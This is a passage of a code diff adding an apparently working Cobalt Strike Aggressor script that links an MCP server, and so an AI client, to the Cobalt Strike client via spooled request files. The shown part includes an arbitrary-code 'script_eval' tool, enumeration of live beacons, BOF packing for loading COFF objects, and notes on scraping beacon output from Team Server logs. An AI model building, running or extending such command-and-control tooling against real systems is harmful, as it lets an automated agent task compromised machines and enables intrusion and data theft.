+        } catch $e {
+            resp_error("include failed for " . $path . ": " . $e);
+            return resp_end();
+        }
+    }
+
+    if ($tool eq "script_eval") {
+        $code = arg_of(%a, "code", "");
+        if ($code eq "") { resp_error("code required"); return resp_end(); }
+        try {
+            $r = eval($code);
+            resp_start();
+            resp_data("result", "" . $r);
+            resp_end();
+            return $RESP;
+        } catch $e {
+            resp_error("eval failed: " . $e);
+            return resp_end();
+        }
+    }
+
+    resp_error("unknown tool: " . $tool);
+    return resp_end();
+}
+
+# ------------------------------ pump ------------------------------------
+#  The running mode lives in a file, not in a script global: a forked
+#  thread does NOT inherit globals, so a global would read as null in
+#  the pump and break the event fallback logic.
+
+sub mode {
+    $m = "";
+    try { $m = trim(read_text(agent_dir() . "/agent.mode")); } catch $e { }
+    if ($m eq "") { return "unknown"; }
+    return $m;
+}
+
+sub set_mode {
+    ($m) = @_;
+    write_text(agent_dir() . "/agent.mode", "" . $m);
+}
+
+sub stop_requested {
+    if (file_exists(agent_dir() . "/stop.flag") == 1) { return 1; }
+    return 0;
+}
+
+sub handle_request {
+    ($id) = @_;
+    $dir = agent_dir();
+    $req = $dir . "/inbox/" . $id . ".req";
+    $res = $dir . "/outbox/" . $id . ".res";
+
+    if (file_exists($res) == 1) { return; }
+    if (claim_file($dir . "/inbox/" . $id . ".claim") == 0) { return; }
+
+    ($tool, %a) = parse_request($req);
+
+    if (arg_of(%a, "token", "") ne agent_token()) {
+        log_msg("auth failure for " . $id);
+        resp_error("invalid or missing token");
+        write_text($res, resp_end());
+        return;
+    }
+
+    $body = "";
+    try {
+        $body = dispatch($tool, %a);
+    } catch $e {
+        resp_error("dispatch exception: " . $e);
+        $body = resp_end();
+    }
+    write_text($res, $body);
+    log_msg("handled " . $id . " tool=" . $tool);
+}
+
+sub scan_inbox {
+    #  The request FILE is the trigger, not the queue.
+    #
+    #  The two sides of this transport run as different users (the CS
+    #  client as root, the MCP server as an unprivileged user), and a
+    #  shared append-only queue file is exactly the kind of thing that
+    #  ends up root owned 0644 and unappendable from the other side.
+    #  Scanning the inbox for request files that have not been claimed
+    #  removes that dependency completely: the .req file is written by
+    #  the MCP server and read by the agent, and nothing else needs to
+    #  be writable by both.
+    #
+    #  The .claim file is the atomic dedup marker (createNewFile), so a
+    #  request is still handled exactly once even if the queue and the
+    #  scan both see it.
+    $dir = agent_dir() . "/inbox";
+    @names = @();
+    try {
+        $f = [new java.io.File: $dir];
+        $names = [$f list];
+    } catch $e { return; }
+    if ($names eq $null) { return; }
+    foreach $n ($names) {
+        $nm = "" . $n;
+        $len = strlen($nm);
+        if ($len < 5) { continue; }
+        if (substr($nm, $len - 4, $len) ne ".req") { continue; }
+        $id = substr($nm, 0, $len - 4);
+        if ($id eq "") { continue; }
+        if (file_exists($dir . "/" . $id . ".claim") == 1) { continue; }
+        try { handle_request($id); } catch $e2 { log_msg("scan error: " . $e2); }
+    }
+}
+
+sub drain_inbox {
+    $dir = agent_dir();
+    #  path 1: the explicit queue
+    $q = read_text($dir . "/inbox/queue.txt");
+    if ($q ne $null && $q ne "") {
+        $lines = split("\n", $q);
+        foreach $ln ($lines) {
+            $id = trim($ln);
+            if ($id eq "") { continue; }
+            try { handle_request($id); } catch $e { log_msg("drain error: " . $e); }
+        }
+    }
+    #  path 2: anything that landed in the inbox without a queue entry
+    try { scan_inbox(); } catch $e3 { log_msg("scan_inbox error: " . $e3); }
+}
+
+sub pump_loop {
+    set_mode("fork");
+    log_msg("pump thread started");
+    while (stop_requested() == 0) {
+        try { drain_inbox(); } catch $e { log_msg("pump error: " . $e); }
+        heartbeat("fork");
+        sleep_ms(pump_interval());
+    }
+    log_msg("pump thread exiting (stop flag)");
+}
+
+sub selftest {
+    $dir = agent_dir();
+    $id = "selftest" . now_ms();
+    $body = "TOOL\tping\nARG\ttoken\t" . esc(agent_token()) . "\nEND\n";
+    write_text($dir . "/inbox/" . $id . ".req", $body);
+    append_text($dir . "/inbox/queue.txt", $id . "\n");
+    $waited = 0;
+    $ok = 0;
+    while ($waited < 50) {
+        if (file_exists($dir . "/outbox/" . $id . ".res") == 1) {
+            # The response must be a SUCCESS, not merely present.  An
+            # earlier build only checked that the file existed, so a
+            # rejected request still reported "PASS".
+            $resp = read_text($dir . "/outbox/" . $id . ".res");
+            if (starts_with($resp, "STATUS\tok") == 1) { $ok = 1; }
+            else { log_msg("selftest bad response: " . $resp); }
+            break;
+        }
+        sleep_ms(100);
+        $waited = $waited + 1;
+    }
+    if ($ok == 1) {
+        set_status("selftest", "pass");
+        log_msg("selftest PASS");
+        println("[cs-agent] self-test PASS (fork pump is live)");
+    }
+    else {
+        set_status("selftest", "fail");
+        log_msg("selftest FAIL - pump did not answer with a valid response");
+        println("[cs-agent] self-test FAIL - pump did not answer in 5s");
+    }
+    return $ok;
+}
+
+#  Probe every primitive this agent depends on and record the result.
+#  Run automatically at load, and on demand with: csagent probe
+sub probe {
+    $d = agent_dir();
+
+    $tok = "";
+    try { $tok = "" . [java.lang.System getProperty: "cs.mcp.token"]; } catch $e { }
+    set_status("java_getproperty", if_null($tok));
+
+    $ms = "";
+    try { $ms = "" . ticks(); } catch $e2 { }
+    set_status("ticks", if_null($ms));
+
+    $ct = "";
+    try { $ct = "" . [java.lang.System currentTimeMillis]; } catch $e3 { }
+    set_status("currentTimeMillis", if_null($ct));
+
+    set_status("dir", agent_dir());
+    set_status("agent_version", agent_version());
+
+    set_status("exists_missing", "" . file_exists($d . "/definitely-not-here"));
+
+    # write/read round trip
+    $probe = $d . "/probe.bin";
+    write_text($probe, "hello-agent");
+    set_status("probe_written_len", "" . file_len($probe));
+    $back = read_text($probe);
+    set_status("probe_read_len", "" . strlen($back));
+    set_status("probe_read_match", "" . if_eq($back, "hello-agent"));
+    set_status("read_strategy", if_null(read_strategy()));
+
+    # one byte read (documented landmine: readb($fh) with NO length
+    # argument returns an EMPTY scalar, it does not read a byte)
+    try {
+        $fh = openf($probe);
+        $b = readb($fh);
+        closef($fh);
+        set_status("readb_1arg_len", "" . strlen("" . $b));
+    } catch $e4 { set_status("readb_1arg_len", "throw"); }
+
+    # char conversion
+    set_status("byte_char_A", if_null(byte_char(65)));
+
+    # BINARY round trip.  This is the property that matters for loading
+    # a .o file: high bytes must survive the write/read cycle, because a
+    # COFF object is not text.
+    $bin = $d . "/probe.bin2";
+    $raw = "";
+    for ($i = 0; $i < 256; $i = $i + 1) {
+        $raw = $raw . byte_char($i);
+    }
+    write_text($bin, $raw);
+    set_status("bin_written_len", "" . file_len($bin));
+    $back2 = read_text($bin);
+    set_status("bin_read_len", "" . strlen($back2));
+    set_status("bin_read_match", "" . if_eq($back2, $raw));
+    set_status("read_strategy", if_null(read_strategy()));
+
+    # hash iteration sanity
+    %hh = %();
+    %hh["alpha"] = "one";
+    %hh["beta"] = "two";
+    $pairs = "";
+    foreach $k => $v (%hh) { $pairs = $pairs . $k . "=" . $v . ","; }
+    set_status("hash_pairs", if_null($pairs));
+
+    # bof_pack is a pure local computation - it packs bytes, it does not
+    # task the beacon, so it is safe to exercise here.
+    try {
+        $pk = bof_pack("1", "z", "probe");
+        set_status("bof_pack_ok", "1");
+        set_status("bof_pack_len", "" . strlen("" . $pk));
+    } catch $e6 { set_status("bof_pack_ok", "throw"); }
+
+    # aggressor api
+    $agok = 0;
+    $nb = 0;
+    $first = "";
+    try {
+        foreach $b (beacons()) {
+            $nb = $nb + 1;
+            if ($first eq "") { $first = "" . $b; }
+        }
+        $agok = 1;
+    } catch $e5 { }
+    set_status("aggressor_ok", "" . $agok);
+    set_status("beacon_count", "" . $nb);
+    set_status("first_beacon", if_null($first));
+
+    set_status("probe_done", now_ms());
+    log_msg("probe done");
+    return 1;
+}
+
+sub if_null {
+    ($s) = @_;
+    if ($s eq $null) { return "<null>"; }
+    return $s;
+}
+
+sub if_eq {
+    ($a, $b) = @_;
+    if ($a == $b) { return "1"; }
+    return "0";
+}
+
+# --------------------------- output capture -----------------------------
+#  CS 4.9 has NO "beacon_output" event (verified: the string does not
+#  exist anywhere in the client jar; the only beacon event is
+#  "beacon_initial").  Task output is therefore captured by the MCP
+#  server tailing the Team Server's per-beacon transcript:
+#     Server/logs/<yymmdd>/<ip>/beacon_<id>.log
+#  which records every [input], [task] and [output] block.
+#  This handler only notes new sessions so the MCP can map ids early.
+
+sub capture_note {
+    ($bid, $text) = @_;
+    if ($text eq $null) { return; }
+    $t = "" . $text;
+    append_text(agent_dir() . "/output.log",
+        now_ms() . "\x1f" . $bid . "\x1f" . esc($t) . "\n");
+}
+
+# ------------------------------- events ---------------------------------
+
+on beacon_initial {
+    capture_note($1, "new session");
+    if (mode() ne "fork") {
+        try { drain_inbox(); } catch $e { }
+    }
+}
+
+# ------------------------------ console ---------------------------------
+
+command csagent {
+    local('$what');
+    $what = $1;
+    if ($what eq "status") {
+        println("[cs-agent] dir   : " . agent_dir());
+        println("[cs-agent] mode  : " . mode());
+        println("[cs-agent] ver   : " . agent_version());
+        println("[cs-agent] token : " . agent_token());
+    }
+    else if ($what eq "stop") {
+        write_text(agent_dir() . "/stop.flag", "1");
+        println("[cs-agent] stop requested");
+    }
+    else if ($what eq "start") {
+        try { $f = [new java.io.File: agent_dir() . "/stop.flag"]; [$f delete]; } catch $e2 { }
+        fork(&pump_loop);
+        println("[cs-agent] pump restarted");
+    }
+    else if ($what eq "selftest") {
+        selftest();
+    }
+    else if ($what eq "probe") {
+        probe();
+    }
+    else {
+        println("[cs-agent] usage: csagent status|start|stop|selftest|probe");
+    }
+}
+
+# -------------------------------- boot ----------------------------------
+#  fork() is the SLEEP built in (sleep/bridges/BasicIO$fork): it runs a
+#  closure on a background thread and returns a handle.  Do NOT define
+#  your own fork - it shadows the built in and the pump silently dies.
+
+ensure_dirs();
+$tok = agent_token();
+write_text(agent_dir() . "/agent.token", $tok);
+
+set_status("agent_version", agent_version());
+set_status("dir", agent_dir());
+set_status("transport", "queue+inbox-scan");
+set_mode("starting");
+set_status("mode", "starting");
+set_status("started", now_ms());
+log_msg("agent loaded v" . agent_version() . " dir=" . agent_dir());
+
+probe();
+
+fork(&pump_loop);
+sleep_ms(500);
+
+if (selftest() == 1) {
+    set_mode("fork");
+    set_status("mode", "fork");
+    heartbeat("fork");
+    println("[cs-agent] cs-mcp-4.9 agent v" . agent_version() . " READY (fork pump)");
+    println("[cs-agent] spool: " . agent_dir() . "  token: " . $tok);
+}
+else {
+    set_mode("event");
+    set_status("mode", "event");
+    heartbeat("event");
+    println("[cs-agent] cs-mcp-4.9 agent v" . agent_version() . " loaded (event pump fallback)");
+    println("[cs-agent] spool: " . agent_dir() . "  token: " . $tok);
+    println("[cs-agent] NOTE: pump did not answer; requests drain on beacon events.");
+}
